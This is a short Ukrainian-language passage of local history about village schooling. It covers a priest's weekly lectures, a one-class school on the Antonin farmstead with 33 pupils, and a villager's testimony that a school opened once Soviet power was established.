<p>З учнями займається священик Павло Травка, який читає 4 лекції в тиждень. Також подається інформація, що на хуторі Антонін дія однокласна школа, яка має 4 кімнати де навчається 33 учні і священик читає дві лекції в тиждень. За свідченнями Курильчика Петра Федоровича  р. в році, коли в селі було встановлено радянську владу, то відразу було відкрито школу.</p>
